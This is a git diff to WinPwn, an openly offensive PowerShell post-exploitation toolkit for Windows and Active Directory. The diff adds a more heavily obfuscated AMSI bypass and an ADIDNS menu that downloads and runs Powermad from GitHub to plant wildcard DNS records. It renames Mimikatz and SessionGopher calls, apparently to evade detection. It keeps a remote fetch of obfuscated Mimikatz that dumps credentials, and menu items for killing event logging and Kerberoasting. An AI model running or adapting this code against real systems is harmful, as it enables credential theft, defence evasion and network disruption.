@@ -1,14 +1,7 @@
-#Zipping Function
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-function Unzip
-{
-    param([string]$zipfile, [string]$outpath)
 
-    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
-}
 function AmsiBypass
 {
-    (([Ref].Assembly.gettypes() | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQAqAHQAaQBsAHMA')))}).GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))) | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0ACoAYQBpAGwAZQBkAA==')))}).SetValue($null,$true)
+    (([Ref].Assembly.gettypes() | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBt'+'AHMAaQA'+'qAHQAaQB'+'sAHMA')))}).GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('T'+'gB'+'vAG4AUAB1AGIAb'+'ABpAGMALABTAHQAYQB0A'+'GkAYwA=')))) | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('Y'+'QBtAHMA'+'aQBJAG4Aa'+'QB0ACoAYQB'+'pAGwAZQ'+'BkAA==')))}).SetValue($null,$true)
 }
 
 function dependencychecks
@@ -287,25 +280,85 @@ function Inveigh {
 }
 
 
-function adidnswildcard
+function adidnsmenu
 {
-    <#
-    .DESCRIPTION
-        Starts Inveigh in a parallel window.
-        Author: @S3cur3Th1sSh1t
-        License: BSD 3-Clause
-    #>
+
     pathcheck
-    $adidns = Read-Host -Prompt 'Are you REALLY sure, that you want to create a Active Directory-Integrated DNS Wildcard record? This can in the worst case cause network disruptions for all clients and servers for the next hours! (yes/no)'
-    if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
+    do
+        {
+	     @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> ADIDNS menu
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Add ADIDNS Node! '
+            Write-Host -ForegroundColor Green '2. Remove ADIDNS Node! '
+            Write-Host -ForegroundColor Green '3. Add Wildcard entry! '
+            Write-Host -ForegroundColor Green '4. Remove Wildcard entry'
+	        Write-Host -ForegroundColor Green '5. Exit. '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{adidns -add}
+                2{adidns -remove}
+                3{adidns -addwildcard}
+                4{adidns -removewildcard}
+             }
+        }
+        While ($masterquestion -ne 5)
+         
+           
+}
+
+
+
+function adidns
+{
+         param(
+        [switch]
+        $addwildcard,
+        [switch]
+        $removewildcard,
+        [switch]
+        $add,
+        [switch]
+        $remove
+	)
+    pathcheck
+    IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Powermad.ps1")
+    if ($addwildcard)
     {
-        IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Powermad.ps1")
-        $target = read-host "Please enter the IP-Adress for the wildcard entry"
-	New-ADIDNSNode -Node * -Tombstone -Verbose -data $target
-        Write-Host -ForegroundColor Red 'Be sure to remove the record with `Disable-ADIDNSNode -Node * -Verbose` at the end of your tests'
-        Write-Host -ForegroundColor Yellow 'Starting Inveigh to capture all theese mass hashes:'
-        Inveigh
+        $adidns = Read-Host -Prompt 'Are you REALLY sure, that you want to create a Active Directory-Integrated DNS Wildcard record? This can in the worst case cause network disruptions for all clients and servers for the next hours! (yes/no)'
+        if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
+        {
+            $target = read-host "Please enter the IP-Adress for the wildcard entry"
+	        New-ADIDNSNode -Node * -Tombstone -Verbose -data $target
+            Write-Host -ForegroundColor Red 'Be sure to remove the record with `Remove-ADIDNSNode -Node * -Verbose` at the end of your tests'
+        }
     }
+    if($removewildcard)
+    {
+        Remove-ADIDNSNode -Node *
+    }
+    if($add)
+    {
+       $target = read-host "Please enter the IP-Adress for the ADIDNS entry"
+       $node = read-host "Please enter the Node name"
+	   New-ADIDNSNode -Node $node -Tombstone -Verbose -data $target
+    }
+    if($remove)
+    {
+       $node = read-host "Please enter the Node name to be removed"
+	   Remove-ADIDNSNode -Node $node
+    }
+
            
 }
 
@@ -333,12 +386,12 @@ function sessionGopher
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
                 Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
-                cachet -hdPXEKUQjxCYg9C -qMELeoMyJPUTJQY >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
+                SeGopher -Thorough -AllDomain >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
             }
             else 
             {
                 Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
-                cachet -qMELeoMyJPUTJQY >> $currentPath\LocalRecon\SessionGopher.txt
+                SeGopher -Alldomain >> $currentPath\LocalRecon\SessionGopher.txt
             }
     }
     else
@@ -351,12 +404,12 @@ function sessionGopher
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
                 Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
-                cachet -hdPXEKUQjxCYg9C >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
+                SeGopher -Thorough >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
             }
             else 
             {
                 Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests,output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
-                cachet >> $currentPath\LocalRecon\SessionGopher.txt
+                SeGopher >> $currentPath\LocalRecon\SessionGopher.txt
             }
     }
 }
@@ -519,7 +572,7 @@ function obfuskittiedump
     pathcheck
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/mimi.ps1')
     Write-Host -ForegroundColor Yellow "Dumping Credentials output goes to .\Exploitation\Credentials.txt"
-    Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
+    Invoke-TheKatz >> $currentPath\Exploitation\Credentials.txt
     Get-Content $currentPath\Exploitation\Credentials.txt
     Start-Sleep -Seconds 5
 }
@@ -2968,7 +3021,7 @@ __        ___       ____
 	Write-Host -ForegroundColor Green '7. Get a SYSTEM Shell! '
         Write-Host -ForegroundColor Green '8. Kerberoasting! '
         Write-Host -ForegroundColor Green '9. Loot local Credentials! '
-        Write-Host -ForegroundColor Green '10. Create an ADIDNS Wildcard! '
+        Write-Host -ForegroundColor Green '10. Create an ADIDNS node! '
         Write-Host -ForegroundColor Green '11. Sessiongopher! '
         Write-Host -ForegroundColor Green '12. Kill the event log services for stealth! '
 	Write-Host -ForegroundColor Green '13. PowerSharpPack menu!'
@@ -2990,7 +3043,7 @@ __        ___       ____
 	         7{SYSTEMShell}
              8{kerberoasting}
              9{kittielocal}
-             10{adidnswildcard}
+             10{adidnsmenu}
              11{sessionGopher}
             12{inv-phantom}
             13{sharpcradle -allthosedotnet}
@@ -3002,8 +3055,5 @@ __        ___       ____
     }
  While ($masterquestion -ne 17)
      
-    
-    #End
-    Write-Host -ForegroundColor Yellow 'Didnt get Domadm? Check the found Files/Shares for sensitive Data/Credentials. Check the Property field of AD-Users for Passwords. Network Shares and Passwords in them can lead to success! Try Responder/Inveigh and SMB-Relaying! ADIDNS is a good addition for the whole network. Crack Kerberoasting Hashes.'
     
 }
